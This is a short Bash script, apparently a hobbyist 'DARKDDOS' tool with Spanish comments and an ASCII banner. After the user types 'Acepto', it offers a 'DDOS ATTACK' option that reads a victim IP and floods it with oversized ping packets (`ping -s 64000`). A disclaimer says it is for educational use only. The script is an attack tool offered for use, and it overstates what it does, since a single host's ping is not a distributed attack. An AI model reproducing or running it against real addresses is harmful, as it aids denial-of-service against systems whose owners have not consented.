#!/bin/bash


BYellow='\033[1;36m'      # Cyan
IRed='\033[0;91m'         # Red
#Author: https://github.com/d0m1d3v
# Esta herramienta solo se usara en entornos controlados para usos educativos.
# usar esta herramienta sin consentimiento es de la persona es ilegal.
# El author no se hace responsable de los usos que se le puedan dar.

clear
echo "${BYellow}"
echo "     ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗"
echo "     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝"
echo "     ██║  ██║███████║██████╔╝█████╔╝ ██║  ██║██║  ██║██║   ██║███████╗"
echo "     ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║  ██║██║  ██║██║   ██║╚════██║"
echo "     ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝██████╔╝╚██████╔╝███████║"
echo "     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
echo "                                                     ${IRed}   v1.0.0 by:d0m1 ${ENDCOLOR}"
echo "                                            ${IRed}https://github.com/d0m1d3v${ENDCOLOR}"
echo "${ENDCOLOR}"
# Creacion de colores
ENDCOLOR="\e[0m"
BIYellow='\033[1;93m'     # Yellow
ICyan='\033[0;96m'        # Cyan
BIGreen='\033[1;92m'      # Green
BIPurple='\033[1;95m'     # Purple
BIRed='\033[1;91m'        # Red
echo "${ENDCOLOR}"




code="Acepto"

echo "${BIGreen}Porfavor acepte los permisos. para aceptar los permisos escriba: Acepto ${ENDCOLOR}"
read password

if [ $password = $code ]; then

	echo "${BIGreen}Seleccione una opcion${ENDCOLOR}"
	echo "[${BIYellow}1${ENDCOLOR}] DDOS ATTACK"
	read opcion

if [ $opcion -eq 1 ]; then
	echo "[${BIPurple}+${ENDCOLOR}]${BIRed}Direccion IP: ${ENDCOLOR}" ${ICyan}
	read victima
	echo "${BIGreen}"
	ping $victima -s 64000 -v
fi

if [ $opcion -ne 1 ]; then
	echo "${BIRed}Porfavor seleccione una opcion valida.${ENDCOLOR}"
fi

else 
	echo "${BIRed}Permisos no aceptados${ENDCOLOR}"
fi